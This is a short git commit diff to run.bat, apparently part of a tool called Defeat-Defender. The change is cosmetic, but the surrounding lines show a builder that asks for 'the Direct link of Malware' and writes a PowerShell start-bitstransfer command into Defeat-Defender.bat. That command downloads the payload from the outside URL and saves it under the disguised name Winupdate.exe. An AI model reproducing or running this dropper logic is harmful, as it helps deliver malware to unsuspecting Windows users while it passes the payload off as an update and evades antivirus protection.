e20192712e44bd355a71b7bf8591a15707edad82
swagkarna <46685308+swagkarna@users.noreply.github.com>
2021-07-19 11:27:11 +0530

    Update run.bat

--- run.bat
+++ run.bat
@@ -6,7 +6,8 @@ echo.
 set /p a="Enter the Direct link of  Malware : "
 if [%a%]==[] (goto error ) else (goto main)
 :main
-echo  Your  Url is :  %a% 
+echo.
+echo Your  Url is :  %a% 
 echo. >>Defeat-Defender.bat
 echo powershell -command "start-bitstransfer %a%   .\Winupdate.exe" >>Defeat-Defender.bat
 echo. >>Defeat-Defender.bat
